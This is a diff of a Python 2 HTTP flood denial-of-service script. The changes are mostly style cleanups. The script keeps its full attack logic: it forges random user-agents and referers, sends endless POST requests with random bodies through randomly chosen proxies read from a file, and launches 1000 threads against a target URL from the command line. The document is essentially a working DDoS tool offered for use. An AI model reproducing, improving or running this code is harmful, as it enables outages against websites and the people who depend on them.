@@ -1,31 +1,32 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 import urllib2
-import urllib
 import threading
 import random
 import re
 import sys
 import socket
-#if responce time is more than 3s, it's really a bad one. there is no need to dos .
+# if responce time is more than 3s, it's really a bad one. there is no need to dos.
 socket.setdefaulttimeout(1)
-#global params
-url=''
-host=''
-attackCount=0
-errorCount=0
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
+# global params
+url = ''
+host = ''
+attackCount = 0
+errorCount = 0
+headers_useragents = []
+headers_referers = []
+request_counter = 0
 F = open('result.txt')
 ips = F.read().split('\n')
 F.close()
 
 def inc_counter():
     global request_counter
-    request_counter+=1
+    request_counter += 1
 
 def set_safe():
     global safe
-    safe=1
+    safe = 1
 
 # generates a user agent array
 def useragent_list():
@@ -42,7 +43,7 @@ def useragent_list():
     headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
     headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
     headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-    return(headers_useragents)
+    return headers_useragents
 
 # generates a referer array
 def referer_list():
@@ -52,14 +53,14 @@ def referer_list():
     headers_referers.append('http://www.baidu.com/s?wd=')
     headers_referers.append('http://engadget.search.aol.com/search?q=')
     headers_referers.append('http://' + host + '/')
-    return(headers_referers)
-#builds random ascii string
+    return headers_referers
+# builds random ascii string
 def buildblock(size):
     out_str = ''
-    for i in range(0, size):
+    for i in range(size):
         a = random.randint(65, 90)
         out_str += chr(a)
-    return(out_str)
+    return out_str
 
 def usage():
     print '---------------------------------------------------'
@@ -69,29 +70,26 @@ def usage():
 def httpcall(url):
     useragent_list()
     referer_list()
-    code=0
-    if url.count("?")>0:
-        param_joiner="&"
-    else:
-        param_joiner="?"
+    code = 0
+    param_joiner = "&" if url.count("?") > 0 else "?"
     #F = open('result.txt')
     #ips = F.read().split('\n')
     #F.close()
     requests = ''
     while 1:
         headers = {
-        'User-Agent':random.choice(headers_useragents),
-        'Cache-Control':'no-cache',
-        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Referer':random.choice(headers_referers) + buildblock(random.randint(5,10)),
-        'Keep-Alive':random.randint(110,120),
-        'Connection':'keep-alive',
-        'Host':host
+            'User-Agent': random.choice(headers_useragents),
+            'Cache-Control': 'no-cache',
+            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+            'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
+            'Keep-Alive': random.randint(110, 120),
+            'Connection': 'keep-alive',
+            'Host': host
         }
-        postdata = urllib.urlencode( {buildblock(random.randint(3,10)):buildblock(random.randint(3,10))} )
-        req = urllib2.Request(url=url,data=postdata,headers=headers)
-        index = random.randint(0,len(ips)-1)
-        proxy = urllib2.ProxyHandler({'http':ips[index]})
+        postdata = buildblock(random.randint(3, 10)) + "=" + buildblock(random.randint(3, 10))
+        req = urllib2.Request(url = url, data = postdata, headers = headers)
+        index = random.randint(0, len(ips) - 1)
+        proxy = urllib2.ProxyHandler({'http': ips[index]})
         print ips[index]
         #opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
         #opener = urllib2.build_opener(urllib2.HTTPHandler)
@@ -99,40 +97,40 @@ def httpcall(url):
         urllib2.install_opener(opener)
         global attackCount
         global errorCount
-        #if attackCount>=previous+100:
+        #if attackCount >= previous + 100:
             #print attackCount
         print 'attack'
-        attackCount+=1
+        attackCount += 1
         print attackCount
-            #previous=attackCount
-        #attackCount+=1
+        #previous = attackCount
+        #attackCount += 1
         try:
             urllib2.urlopen(req)
-        except Exception,e:
+        except Exception, e:
             print e
             print 'error'
-            errorCount+=1
-            print attackCount*1.0/errorCount
+            errorCount += 1
+            print errorCount * 1.0 / attackCount
             continue
 
-#http caller thread
+# http caller thread
 class HTTPThread(threading.Thread):
     def run(self):
         httpcall(url)
 
-#execute
+# execute
 if len(sys.argv) < 2:
     usage()
     sys.exit()
 else:
-    if sys.argv[1]=="help":
+    if sys.argv[1] == "help":
         usage()
         sys.exit()
     else:
         print "-- Attack Started --"
         url = sys.argv[1]
-        if url.count("/")==2:
-            url = url + "/"
+        if url.count("/") == 2:
+            url += "/"
         m = re.search('http\://([^/]*)/?.*', url)
         host = m.group(1)
         for i in range(1000):
